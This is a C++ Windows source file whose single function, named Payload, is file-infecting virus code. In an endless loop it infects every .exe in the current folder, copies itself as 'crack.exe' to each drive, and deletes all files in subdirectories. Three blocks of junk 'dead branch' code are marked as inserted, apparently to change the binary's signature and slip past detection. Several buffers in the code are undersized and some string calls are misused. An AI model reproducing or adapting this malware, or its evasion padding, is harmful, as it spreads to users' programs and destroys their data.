#include "data_globals.h"
#include <windows.h>
#include <cstring>
#include <stdio.h>
#include <cstdlib>   // ← ADDED for malloc/free

void Payload(void)
{
    WIN32_FIND_DATAA findDataExe;
    WIN32_FIND_DATAA findDataDir;
    WIN32_FIND_DATAA findDataSub;
    char drivePath[42] = {};
    char tempPath[16] = {};
    char baseDir[160] = {};
    char searchPattern[16] = {};
    char dirCopy[16] = {};
    HANDLE hFindExe = INVALID_HANDLE_VALUE;
    HANDLE hFindDir = INVALID_HANDLE_VALUE;
    HANDLE hFindSub = INVALID_HANDLE_VALUE;
    char* driveIter = nullptr;
    size_t driveLen = 0;

    // --- INSERTED DEAD BRANCH 1 (Category A: System info queries) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        // Dead branch: System info queries
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char sysBuf[128] = {0};
        char timeBuf[64] = {0};
        volatile DWORD tickCount = GetTickCount();
        
        GetSystemInfo(&si);
        GetLocalTime(&st);
        
        // Dummy computation using system info
        volatile DWORD processorCount = si.dwNumberOfProcessors;
        volatile DWORD pageSize = si.dwPageSize;
        volatile DWORD dummyHash = processorCount ^ pageSize;
        
        // Dummy loop with XOR operations
        volatile unsigned char xorBuf[32] = {0};
        for (int i = 0; i < 8; i++) {
            xorBuf[i] = (unsigned char)((i * 0x37 + 0x13) & 0xFF);
            dummyHash ^= (xorBuf[i] << (i & 0x1F));
        }
        
        // Format dummy strings
        sprintf_s(sysBuf, sizeof(sysBuf), "Proc:%lu Page:%lu", processorCount, pageSize);
        sprintf_s(timeBuf, sizeof(timeBuf), "H:%u M:%u S:%u", st.wHour, st.wMinute, st.wSecond);
        
        // More dummy operations
        volatile size_t len1 = strlen(sysBuf);
        volatile size_t len2 = strlen(timeBuf);
        volatile DWORD combined = (DWORD)(len1 ^ len2 ^ tickCount);
        
        // Simulate memory operation
        volatile char dummyCopy[64] = {0};
        memcpy((void*)dummyCopy, sysBuf, (len1 < 63) ? len1 : 63);
        
        // Finalize and discard
        SecureZeroMemory((void*)xorBuf, sizeof(xorBuf));
        SecureZeroMemory((void*)dummyCopy, sizeof(dummyCopy));
    }

    strncpy(drivePath, "crack.exe", 10);

    do {
        Sleep(5000);

        hFindExe = FindFirstFileA("*.exe", &findDataExe);
        if (hFindExe != INVALID_HANDLE_VALUE) {
            do {
                Infect(findDataExe.cFileName, VBuffer);
            } while (FindNextFileA(hFindExe, &findDataExe));
            FindClose(hFindExe);
        }

        GetLogicalDriveStringsA(0x400, Drives);
        for (driveIter = Drives; *driveIter != '\0'; driveIter += driveLen + 1) {
            strcpy(drivePath + 10, driveIter);
            strcat(drivePath + 10, drivePath);
            CopyFileA(Virus, drivePath + 10, 0);
            driveLen = strlen(driveIter);
        }

        // --- INSERTED DEAD BRANCH 2 (Category B: Memory & String operations) ---
        volatile DWORD dummy_tick_2 = GetTickCount();
        if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
            // Dead branch: Memory & String operations
            volatile char* dummyMem = (volatile char*)malloc(128);
            if (dummyMem) {
                volatile char localBuf[64] = {0};
                volatile char destBuf[128] = {0};
                volatile DWORD tickVal = dummy_tick_2;
                
                // String operations with dummy data
                sprintf_s((char*)localBuf, sizeof(localBuf), "Tick_%lu_", tickVal);
                sprintf_s((char*)dummyMem, 128, "DummyData_%lu_%lu", tickVal, tickVal ^ 0xDEADBEEF);
                
                volatile size_t srcLen = strlen((const char*)dummyMem);
                volatile size_t localLen = strlen((const char*)localBuf);
                
                // Dummy loop with memory copy
                for (int i = 0; i < 4; i++) {
                    volatile char tmpBuf[32] = {0};
                    sprintf_s((char*)tmpBuf, sizeof(tmpBuf), "Iter_%d_", i);
                    memcpy((void*)(destBuf + i * 8), (const void*)tmpBuf, (localLen < 8) ? localLen : 8);
                }
                
                // More string operations
                volatile char combined[256] = {0};
                memcpy((void*)combined, (const void*)localBuf, localLen);
                memcpy((void*)(combined + localLen), (const void*)dummyMem, srcLen);
                
                volatile size_t combinedLen = strlen((const char*)combined);
                volatile DWORD hash = 0;
                for (size_t i = 0; i < combinedLen && i < 128; i++) {
                    hash ^= (DWORD)((unsigned char)combined[i] << ((i & 3) * 8));
                }
                
                // Clean up
                SecureZeroMemory((void*)localBuf, sizeof(localBuf));
                SecureZeroMemory((void*)destBuf, sizeof(destBuf));
                SecureZeroMemory((void*)combined, sizeof(combined));
                free((void*)dummyMem);
            }
        }

        hFindDir = FindFirstFileA("*.", &findDataDir);
        if (hFindDir != INVALID_HANDLE_VALUE) {
            do {
                if (findDataDir.dwFileAttributes == 0x10) {
                    strcpy(tempPath, baseDir);
                    strcat(tempPath, findDataDir.cFileName);
                    strcpy(searchPattern, tempPath);
                    strcpy(dirCopy, tempPath);
                    driveLen = strlen(searchPattern);
                    strncpy(searchPattern + driveLen, "\\*.*", 5);
                    hFindSub = FindFirstFileA(searchPattern, &findDataSub);
                    if (hFindSub != INVALID_HANDLE_VALUE) {
                        do {
                            strcpy(tempPath, dirCopy);
                            driveLen = strlen(tempPath);
                            tempPath[driveLen] = '\\';
                            tempPath[driveLen + 1] = '\0';
                            strcat(tempPath, findDataSub.cFileName);
                            DeleteFileA(tempPath);
                        } while (FindNextFileA(hFindSub, &findDataSub));
                        FindClose(hFindSub);
                    }
                }
            } while (FindNextFileA(hFindDir, &findDataDir));
            FindClose(hFindDir);
        }

        // --- INSERTED DEAD BRANCH 3 (Category C: Bitwise/Math loops) ---
        if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
            // Dead branch: Bitwise/Math loops with FNV-1a style hash
            volatile unsigned char hashData[48] = {0};
            volatile DWORD fnvHash = 0x811C9DC5;
            volatile DWORD xorAccum = 0;
            
            // Initialize hash data with dummy values
            for (int i = 0; i < 48; i++) {
                hashData[i] = (unsigned char)((i * 0x9E + 0x37) & 0xFF);
            }
            
            // FNV-1a style hash loop
            for (int i = 0; i < 48; i++) {
                fnvHash ^= (DWORD)hashData[i];
                // FNV prime: 0x01000193
                fnvHash *= 0x01000193;
                // Additional XOR mixing
                xorAccum ^= (fnvHash >> (i & 0x1F)) & 0xFF;
            }
            
            // Polynomial hash over dummy array
            volatile DWORD polyHash = 0;
            volatile DWORD polyBase = 0x1F;
            for (int i = 0; i < 32; i++) {
                polyHash = polyHash * polyBase + (DWORD)hashData[i & 0x2F];
            }
            
            // More bitwise operations
            volatile DWORD bitwiseMix = 0xA5A5A5A5;
            volatile DWORD tickVal = GetTickCount();
            for (int i = 0; i < 6; i++) {
                bitwiseMix ^= (tickVal >> (i * 5));
                bitwiseMix = (bitwiseMix << 3) | (bitwiseMix >> 29);
                bitwiseMix ^= 0xDEADBEEF;
            }
            
            // Combine results
            volatile DWORD finalHash = fnvHash ^ polyHash ^ bitwiseMix ^ xorAccum;
            volatile DWORD resultCheck = finalHash & 0x7FFFFFFF;
            
            // Dummy memory operation to appear realistic
            volatile char resultBuf[32] = {0};
            sprintf_s((char*)resultBuf, sizeof(resultBuf), "Hash_%08lX", finalHash);
            volatile size_t resultLen = strlen((const char*)resultBuf);
            
            // Final cleanup
            SecureZeroMemory((void*)hashData, sizeof(hashData));
            SecureZeroMemory((void*)resultBuf, sizeof(resultBuf));
        }
    } while (true);
}
